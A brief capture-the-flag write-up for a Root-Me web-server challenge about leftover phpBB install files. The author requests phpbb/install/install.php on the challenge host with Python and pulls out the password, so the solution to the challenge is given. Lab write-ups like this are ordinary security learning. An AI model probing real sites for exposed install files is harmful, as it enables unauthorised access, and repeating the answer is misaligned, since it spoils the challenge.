WebServer Challenge 6 - Install files


Synopsis: "Do  you know PHPBB? "

It was safe to say the goal here was to look for default phpBB files.

By appending: phpbb/install/install.php to the request we retrieved the password

>>> r = requests.get('http://challenge01.root-me.org/web-serveur/ch6/phpbb/install/install.php')
>>> re.findall('est : *.*\w\w\w',r.content)
['est : karambar']
